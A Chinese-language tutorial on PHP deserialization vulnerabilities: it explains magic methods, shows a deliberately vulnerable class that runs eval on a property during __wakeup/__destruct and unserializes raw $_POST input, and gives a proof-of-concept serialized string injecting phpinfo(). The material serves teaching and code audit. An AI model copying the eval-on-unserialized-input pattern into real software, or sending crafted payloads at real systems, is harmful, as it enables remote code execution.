[TOC]



# ==PHP反序列化漏洞原理==

1、强化对PHP面向对象的理解

2、理解面向对象中的魔术方法

3、理解反序列化漏洞的形成原理

4、实现反序列化漏洞代码和利用

反序列化漏洞时基于序列化和反序列化的操作，在反序列化unserialize()时，存在用户可控参数，而反序列化会自动调用一些魔术方法`__wakeup()   __destruct()` 如果这些魔术方法内 存在一些敏感函数 比如 `eval()` 函数，而且参数是通过反序列化中的字符串传入的，那么用户就可以通过修改反序列化字符串中的值来执行敏感操作，这就是反序列化漏洞

## 一、PHP反序列化回顾

### 1、PHP面向对象代码

```php
<?php

class People{
    var $name = '';
    var $sex = '';
    var $age = '';
    var $addr = '';

    //魔术方法  __construct 我称其为构造函数，在类实例化时自动调用
    function __construct($name="zhangsan",$sex="male",$age="20",$addr="shenzhen") {
        $this->name = $name;
        $this->sex = $sex;
        $this->age = $age;
        $this->addr = $addr;

        echo "<br>constuct over</br>";
    }

    //魔术方法 __sleep，在类的实例化被序列化时，自动调用，并且要求该函数返回一个array，其中想序列化哪些属性，就在数组中填写属性名称
    function __sleep(){
        echo "<br>serializing</br>";
        // @eval($this->name);

        return array("name","sex","age","addr");

    }

    //魔术方法 __wakeup，在字符串被反序列化时，自动调用
    function __wakeup(){
        echo "<br>unserializing</br>";
        @eval($this->name);

    }

    //魔术方法 __destruct 我称其为析构函数，类的实例使用结束，即类的实例从内存中释放时，自动调用
    function __destruct(){
        echo "<br>destruct over</br>";
        // @eval($this->name);

    }

    function GetName(){
        echo "<br>".$this->name."</br>";
    }

}

//序列化过程
// $p1 = new People();
// echo $p1->GetName();
// echo "<br>".serialize($p1)."</br>";

//反序列化过程
// $source = 'O:6:"People":4:{s:4:"name";s:4:"lisi";s:3:"sex";s:4:"male";s:3:"age";s:2:"20";s:4:"addr";s:8:"shenzhen";}';
$source = 'O:6:"People":4:{s:4:"name";s:10:"phpinfo();";s:3:"sex";s:0:"";s:3:"age";s:0:"";s:4:"addr";s:0:"";}';
$p2 = unserialize($source);
$p2->GetName();

?>
```

>  PHP中的Session文件中的内容，查看是否为序列化后的内容

### 2、魔术方法

在PHP反序列化的过程中会自动执行一些魔术方法，完整列表如下：

| 方法名       | 调用条件                                                     |
| ------------ | ------------------------------------------------------------ |
| __call       | 调用不可访问或不存在的方法时，自动调用`__call($name,$args)`  |
| __callStatic | 调用不可访问或不存在的静态方法时被调用                       |
| __clone      | 进行对象clone时被调用，用来调整对象的克隆行为                |
| __construct  | 构造对象时被调用                                             |
| __debuginfo  | 当调用var_dump()打印对象时被调用（当你不想打印所有元素）适用于PHP5.6版本 |
| __destruct   | 明确销毁对象或脚本结束时被调用                               |
| __get        | 读取不可访问或不存在属性时被调用                             |
| __invoke     | 当以函数方式调用对象时被调用                                 |
| __isset      | 当对不可访问或不存在的属性调用isset()或empty()时被调用       |
| __set        | 当对不可访问或不存在的属性赋值时被调用                       |
| __set_state  | 当调用var_export()导出类时，此静态方法被调用。且用__set_state的返回值作为var_export()函数的返回值 |
| __sleep      | 当使用serialize序列化时被调用，当你不需要保存大对象的所有数据时很有用 |
| __toString   | 当一个类被转换成字符串时被调用                               |
| __unset      | 对不可访问或不存在的属性进行unset()时被调用                  |
| __wakeup     | 当使用unserialize发序列化时被调用，可用来做一些对象初始化的操作 |

## 二、反序列化漏洞

### 1、上述代码存在反序列化漏洞的代码

```php
//魔术方法 __wakeup，在字符串被反序列化时，自动调用
function __wakeup(){
    echo "<br>unserializing</br>";
    @eval($this->name);

}

//魔术方法 __destruct 我称其为析构函数，类的实例使用结束，即类的实例从内存中释放时，自动调用
function __destruct(){
    echo "<br>destruct over</br>";
    // @eval($this->name);

}

function GetName(){
    echo "<?php".$this->name."?>";
}

$p2 = unserialize($_POST['code']);
$p2->GetName();

```

### 2、如何利用反序列化漏洞

（1）先分析代码的结构，值如何传入，什么情况下会被调用，被调用后是什么结果

（2）由于反序列化所需要的序列值通常是比较复杂的结构，人为手工构造很容易出错且基本是不可能的事，所以需要我们自己编写一个类，该类与源代码中的类 具有相同的类名，相同的属性，甚至相同代码的类，用于生成序列化之后的字符串

新建一个PHP源文件 unserializePOC.php

```php
<?php

class People{
    var $name = 'phpinfo();';
    var $sex = '';
    var $age = '';
    var $addr = '';
}
$p1 = new People();
echo serialize($p1);

?>
```

> 输出为 `O:6:"People":4:{s:4:"name";s:10:"phpinfo();";s:3:"sex";s:0:"";s:3:"age";s:0:"";s:4:"addr";s:0:"";}`

（3）从上述代码中获取到反序列化的结果，然后将该值传入有漏洞的代码，完成利用

因为传入序列值，该代码会反序列化，而我所传入的序列值中的name为 phpinfo() 又因为反序列化时会自动调用 `__wakeup()` 和 `__destruct()` ，所以敏感函数只要存在这两个魔术方法中都可以实现漏洞利用

![image-20240825212826615](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240825212826615.png)

### 3、关于 __wakeup

```php
//魔术方法 __wakeup，在字符串被反序列化时，自动调用
function __wakeup(){
    echo "<br>unserializing</br>";
    $this->name = "ymqyyds";
    // @eval($this->name);

}

//魔术方法 __destruct 我称其为析构函数，类的实例使用结束，即类的实例从内存中释放时，自动调用
function __destruct(){
    // @eval($this->name);
    echo "<br>destruct over</br>";
    @eval($this->name);

}

//反序列化过程
// $source = 'O:6:"People":4:{s:4:"name";s:4:"lisi";s:3:"sex";s:4:"male";s:3:"age";s:2:"20";s:4:"addr";s:8:"shenzhen";}';
// $source = 'O:6:"People":4:{s:4:"name";s:10:"phpinfo();";s:3:"sex";s:0:"";s:3:"age";s:0:"";s:4:"addr";s:0:"";}';

$p2 = unserialize($_POST['code']);
$p2->GetName();
```

__wakeup 中没有 `$this->name = "ymqyyds";` 代码时

![image-20240825214513833](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240825214513833.png)

__wakeup 中有 `$this->name = "ymqyyds";` 代码时

![image-20240825214309257](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240825214309257.png)

为什么，不就是把 `__destruct() 函数中的 @eval($this->name);代码 中的$this->name换成了ymqyyds吗` POST中传入的值都是一样的，为什么会报错呢

如果我们把 `@eval($this->name);` 代码移动到 ` echo "<br>destruct over</br>";` 前面

![image-20240825215004634](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240825215004634.png)

果然，此时就不会输出 destruct over，问题出在了 `@eval($this->name);` 或者说 `@eval("ymqyyds");` 上

调试

![image-20240825215230394](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240825215230394.png)

## 课程小结

本节内容只是简单解释反序列化漏洞，与真实的利用情况还有很大的出入，同时反序列化漏洞也是代码审计时，除了敏感函数和输入校验外，比较重视的一种情况